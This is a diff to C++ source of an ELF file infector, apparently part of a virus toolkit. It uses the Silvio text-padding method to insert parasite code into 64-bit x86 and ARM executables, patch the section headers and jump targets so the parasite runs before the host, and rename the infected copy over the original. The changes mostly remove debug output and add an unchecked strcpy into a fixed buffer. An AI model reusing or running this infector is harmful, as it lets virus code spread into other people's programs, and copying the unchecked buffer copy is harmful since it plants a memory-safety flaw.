@@ -1,8 +1,8 @@
 #include "infector/silvio.hh"
 #include <linux/elf.h>
+#include <linux/limits.h>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
-#include "common/string.hh"
 #include "std/string.hh"
 /********************  ALGORITHM   *********************
 
@@ -135,7 +135,7 @@ bool patch_parasite_and_resume_control(
   auto cur = common::find<uint64_t>(host_mapping.base() + info.parasite_offset,
                                     parasite_size, 0x9090909090909090);
   if (cur == -1) {
-    printf("failed to patch host entry\n");
+    // printf("failed to patch host entry\n");
     return false;
   }
   int32_t rel = 0;
@@ -166,7 +166,7 @@ bool patch_parasite_and_resume_control(
   auto cur = common::find<uint32_t>(host_mapping.base() + info.parasite_offset,
                                     parasite_size, 0xd503201f);
   if (cur == -1) {
-    printf("failed to patch host entry\n");
+    // printf("failed to patch host entry\n");
     return false;
   }
   int32_t rel = 0;
@@ -185,7 +185,6 @@ bool patch_parasite_and_resume_control(
   rel /= 4;
   auto* inst =
       (int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur);
-  printf("patching jump at %x\n", info.parasite_offset + cur);
 
   *inst = rel;
 
@@ -227,8 +226,6 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
 
       parasite_load_address =
           next_32_bit_aligned_addr(phdr_entry->p_vaddr + phdr_entry->p_filesz);
-      printf("code segment end %x\n", code_segment_end_offset);
-      printf("parasite offset %x\n", parasite_offset);
       continue;
     }
 
@@ -239,7 +236,6 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
         // is really wrong if it's not.
         return false;
       }
-      printf("next segment begin %x\n", phdr_entry->p_offset);
       // Return padding_size (maximum size of parasite that host can accomodate
       // in its padding between the end of CODE segment and start of next
       // loadable segment)
@@ -273,14 +269,14 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Get Home size (in bytes) of parasite residence in host
   // and check if host's home size can accomodate a parasite this big in size
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
-    printf("Cannot correctly parse host elf\n");
+    // printf("Cannot correctly parse host elf\n");
     return false;
   }
 
   if (info.padding_size < parasite_mapping.size()) {
-    printf(
-        "Host cannot accomodate parasite padding size: %d parasite size: %d\n",
-        info.padding_size, parasite_mapping.size());
+    // printf(
+    //    "Host cannot accomodate parasite padding size: %d parasite size:
+    //    %d\n", info.padding_size, parasite_mapping.size());
     return false;
   }
 
@@ -290,7 +286,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch section header table to increase text section size
   if (!patch_sht(host_mapping, parasite_mapping.size(),
                  info.code_segment_end_offset)) {
-    printf("Failed to patch section header table\n");
+    // printf("Failed to patch section header table\n");
     return false;
   }
 
@@ -316,11 +312,14 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
   if (!parasite.valid()) {
     return false;
   }
-  common::String tmp(host_path);
 
-  const char postfix = '.';
-  tmp += postfix;
-  vt::common::FileDescriptor output(tmp.c_str(), O_RDWR | O_CREAT, S_IRWXU);
+  char tmp[PATH_MAX];
+  auto len = strlen(host_path);
+  strcpy(tmp, host_path);
+  tmp[len] = '.';
+  tmp[len + 1] = '\0';
+
+  vt::common::FileDescriptor output(tmp, O_RDWR | O_CREAT, S_IRWXU);
 
   if (!output.valid()) {
     return false;
@@ -353,7 +352,7 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
   if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
     return false;
   }
-  if (rename(tmp.c_str(), host_path) < 0) {
+  if (rename(tmp, host_path) < 0) {
     return false;
   }
   return true;
